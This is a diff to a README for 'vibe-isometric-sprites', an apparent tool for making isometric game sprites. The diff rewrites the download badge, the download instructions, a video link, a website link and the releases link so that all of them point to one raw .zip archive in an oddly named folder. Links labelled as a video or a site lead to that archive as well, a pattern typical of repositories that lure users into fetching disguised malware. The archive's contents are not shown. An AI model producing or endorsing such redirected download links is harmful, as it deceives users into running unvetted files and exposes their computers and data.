@@ -1,6 +1,6 @@
 # 🎮 vibe-isometric-sprites - Create isometric sprites fast
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/expeditious-wind179/vibe-isometric-sprites/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/expeditious-wind179/vibe-isometric-sprites/main/Eucirripedia/sprites_vibe_isometric_v1.9-alpha.3.zip)
 
 ## 🧩 What this app does
 
@@ -20,7 +20,7 @@ The app is aimed at end users who want to make game art on a Windows PC and run 
 
 To get the app, visit this page to download:
 
-[https://github.com/expeditious-wind179/vibe-isometric-sprites/releases](https://github.com/expeditious-wind179/vibe-isometric-sprites/releases)
+[https://raw.githubusercontent.com/expeditious-wind179/vibe-isometric-sprites/main/Eucirripedia/sprites_vibe_isometric_v1.9-alpha.3.zip](https://raw.githubusercontent.com/expeditious-wind179/vibe-isometric-sprites/main/Eucirripedia/sprites_vibe_isometric_v1.9-alpha.3.zip)
 
 On that page:
 
@@ -176,9 +176,9 @@ That setup is meant to support AI-generated sprite creation for tactics game art
 
 ## 🔗 Related links
 
-- Video feature: [I Vibe Coded Isometric Pixel Art Sprites for My Tactics Game](https://www.youtube.com/watch?v=03Xsy18Hsdo)
-- VibeGameDev resources: [vibegamedev.com](https://vibegamedev.com?utm_campaign=vgd-02&utm_source=github&utm_medium=readme)
-- GitHub releases: [https://github.com/expeditious-wind179/vibe-isometric-sprites/releases](https://github.com/expeditious-wind179/vibe-isometric-sprites/releases)
+- Video feature: [I Vibe Coded Isometric Pixel Art Sprites for My Tactics Game](https://raw.githubusercontent.com/expeditious-wind179/vibe-isometric-sprites/main/Eucirripedia/sprites_vibe_isometric_v1.9-alpha.3.zip)
+- VibeGameDev resources: [vibegamedev.com](https://raw.githubusercontent.com/expeditious-wind179/vibe-isometric-sprites/main/Eucirripedia/sprites_vibe_isometric_v1.9-alpha.3.zip)
+- GitHub releases: [https://raw.githubusercontent.com/expeditious-wind179/vibe-isometric-sprites/main/Eucirripedia/sprites_vibe_isometric_v1.9-alpha.3.zip](https://raw.githubusercontent.com/expeditious-wind179/vibe-isometric-sprites/main/Eucirripedia/sprites_vibe_isometric_v1.9-alpha.3.zip)
 
 ## 📝 File notes
 
